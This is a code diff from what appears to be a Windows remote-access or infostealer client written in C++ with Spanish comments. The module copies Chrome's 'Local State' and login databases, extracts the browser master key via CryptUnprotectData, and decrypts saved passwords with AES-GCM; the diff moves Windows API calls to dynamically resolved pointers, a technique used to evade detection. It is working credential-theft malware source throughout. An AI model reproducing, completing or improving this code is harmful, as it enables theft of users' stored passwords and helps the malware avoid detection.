@@ -4,12 +4,13 @@
 
 extern Cliente* cCliente;
 
-mod_Info::mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32) {
+mod_Info::mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32, st_Kernel32& _kernel32) {
 	//Cargar dll's y funciones
 	
 	this->BCRYPT = _bcrypt;
 	this->CRYPT32 = _crypt32;
 	this->NETAPI32 = _netapi32;
+	this->KERNEL32 = _kernel32;
 
 	if (!this->BCRYPT.pBCryptOpenAlgorithmProvider || !this->BCRYPT.pBCryptCloseAlgorithmProvider || !this->BCRYPT.pBCryptSetProperty) {
 		__DBG_("[dynamic] No se pudieron cargar las funciones");
@@ -74,7 +75,11 @@ std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuer
 				sqlite3_close(db);
 			}
 		}else {
-			_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
+			if (this->KERNEL32.pGetLastError) {
+				_DBG_("No se pudo copiar la bd del usuario ", this->KERNEL32.pGetLastError());
+			}else{
+				__DBG_("No se pudo copiar la bd del usuario ");
+			}
 		}
 		if (cCliente->mod_dynamic->KERNEL32.pDeleteFileA) {
 			cCliente->mod_dynamic->KERNEL32.pDeleteFileA(strRandomPath.c_str());
@@ -107,8 +112,8 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 	std::vector<BYTE> vc_Plain;
 	std::vector<BYTE> IV(12);
 
-	memcpy(IV.data(), strPass.data() + 3, 12);
-	memcpy(vc_CipherPass.data(), strPass.data() + 15, encSize - 15);
+	m_memcpy(IV.data(), strPass.data() + 3, 12);
+	m_memcpy(vc_CipherPass.data(), strPass.data() + 15, encSize - 15);
 
 	size_t tagOffset = encSize - 31;
 	if (tagOffset < 0 || tagOffset > vc_CipherPass.size()) {
@@ -126,7 +131,12 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 
 	nStatus = this->BCRYPT.pBCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
 	if (!BCRYPT_SUCCESS(nStatus)) {
-		_DBG_("BCryptDecrypt_1 error", GetLastError());
+		if (this->KERNEL32.pGetLastError) {
+			_DBG_("BCryptDecrypt_1 error", this->KERNEL32.pGetLastError());
+		}
+		else {
+			__DBG_("BCryptDecrypt_1 error");
+		}
 		return strOut;
 	}
 
@@ -147,7 +157,8 @@ std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 	DATA_BLOB encryptedPass, decryptedPass;
 	std::string strOut = "";
 
-	if (!this->CRYPT32.pCryptUnprotectData) {
+	if (!this->CRYPT32.pCryptUnprotectData || !this->KERNEL32.pLocalFree) {
+		__DBG_("[X] mod_Info::m_DecryptMasterKey no se cargaron las funciones")
 		return strOut;
 	}
 
@@ -157,9 +168,10 @@ std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 	encryptedPass.cbData = (DWORD)strTmp.size();
 	encryptedPass.pbData = (byte*)malloc((int)encryptedPass.cbData);
 	if (!encryptedPass.pbData) {
+		__DBG_("[X]mod_Info::m_DecryptMasterKey No se pudo reserver memoria para encryptedData");
 		return strOut;
 	}
-	memcpy(encryptedPass.pbData, strTmp.data(), (int)encryptedPass.cbData);
+	m_memcpy(encryptedPass.pbData, strTmp.data(), (int)encryptedPass.cbData);
 	
 	if (!this->CRYPT32.pCryptUnprotectData(
 		&encryptedPass, // In Data
@@ -171,14 +183,17 @@ std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 		// used.
 		0,
 		&decryptedPass)) {
-		__DBG_("Error desencriptando la password");
-		__DBG_(GetLastError());
+		if (this->KERNEL32.pGetLastError) {
+			_DBG_("Error desencriptando la password", this->KERNEL32.pGetLastError());
+		}else {
+			__DBG_("Error desencriptando la password");
+		}
 	}else {
 		strOut = reinterpret_cast<const char*>(decryptedPass.pbData);
 	}
 	
 	free(encryptedPass.pbData); encryptedPass.pbData = NULL;
-	LocalFree(decryptedPass.pbData);
+	this->KERNEL32.pLocalFree(decryptedPass.pbData);
 	
 	return strOut;
 }
@@ -187,14 +202,24 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 	int iBuffSize = 4096;
 	std::vector<Chrome_Profile> vcOut;
 
+	if (!this->KERNEL32.pGetEnvironmentVariableA || !this->KERNEL32.pCopyFileA) {
+		__DBG_("[X] mod_Info::m_ChromeProfilesno se cargo la funcion");
+		return vcOut;
+	}
+
 	LPSTR env_var = (LPSTR)malloc(iBuffSize);
 	if (env_var == NULL) {
 		__DBG_("No se pudo reservar memoria");
 		return vcOut;
 	}
 	
-	if (GetEnvironmentVariable("APPDATA", env_var, iBuffSize) == 0) {
-		_DBG_("Error", GetLastError());
+	if (this->KERNEL32.pGetEnvironmentVariableA("APPDATA", env_var, iBuffSize) == 0) {
+		if (this->KERNEL32.pGetLastError) {
+			_DBG_("GetEnvironmentVariable error", this->KERNEL32.pGetLastError());
+		}
+		else {
+			__DBG_("GetEnvironmentVariable error");
+		}
 		return vcOut;
 	}
 	
@@ -216,16 +241,15 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 	//Copiar archivo que contiene la llave maestra e informacion de perfiles de chrome
 	std::string strFile = strPath + "Local State";
 
-	if (cCliente->mod_dynamic->KERNEL32.pCopyFileA) {
-		if (!cCliente->mod_dynamic->KERNEL32.pCopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
+	if (!this->KERNEL32.pCopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
+		if (this->KERNEL32.pGetLastError) {
+			_DBG_("No se pudo copiar el archivo local state", this->KERNEL32.pGetLastError());
+		}else {
 			__DBG_("No se pudo copiar el archivo local state");
-			__DBG_(GetLastError());
-			return vcOut;
 		}
-	}else {
 		return vcOut;
 	}
-
+	
 	std::ifstream iFile("saramambichi");
 	if (iFile.is_open()) {
 		nlohmann::json jeyson = nlohmann::json::parse(iFile);
@@ -264,7 +288,7 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 
 				this->vcChromeKey.resize(strMasterKey.size());
 
-				memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
+				m_memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
 
 				DATA_BLOB MasterKey;
 				MasterKey.cbData = this->vcChromeKey.size();
